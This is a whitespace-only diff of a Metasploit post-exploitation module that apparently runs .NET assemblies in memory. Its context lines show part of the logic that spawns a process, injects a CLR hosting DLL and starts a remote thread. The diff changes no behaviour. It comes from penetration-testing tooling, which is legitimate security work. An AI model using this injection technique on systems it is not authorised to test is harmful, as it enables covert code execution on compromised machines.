@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('ASSEMBLY', [true, 'Assembly file name']),
         OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory',
-                                     ::File.join(Msf::Config.data_directory, 
+                                     ::File.join(Msf::Config.data_directory,
                                                  'execute-assembly')]),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
         OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
@@ -80,7 +80,7 @@ class MetasploitModule < Msf::Post
     out_process_name = if process_name.split(//).last(4).join.eql? '.exe'
                          process_name
                        else
-                         process_name + '.exe' 
+                         process_name + '.exe'
                        end
     out_process_name
   end
@@ -106,7 +106,7 @@ class MetasploitModule < Msf::Post
 
     library_path = ::File.join(Msf::Config.data_directory,
                                'post', 'execute-assembly',
-							   'HostingCLRx64.dll')
+                               'HostingCLRx64.dll')
     library_path = ::File.expand_path(library_path)
 
     print_status("Injecting Host into #{process.pid}...")
@@ -137,7 +137,7 @@ class MetasploitModule < Msf::Post
     hprocess.thread.create(exploit_mem + offset, assembly_mem)
 
     sleep(datastore['WAIT'])
-    
+
     if datastore['PID'] <= 0
       read_output(process)
       print_good("Killing process #{hprocess.pid}")
@@ -182,7 +182,7 @@ class MetasploitModule < Msf::Post
   def read_output(process)
     print_status('Start reading output')
     begin
-      loop do 
+      loop do
         output = process.channel.read 
         output.split("\n").each { |x| print_good(x) }
         break if output.length == 0
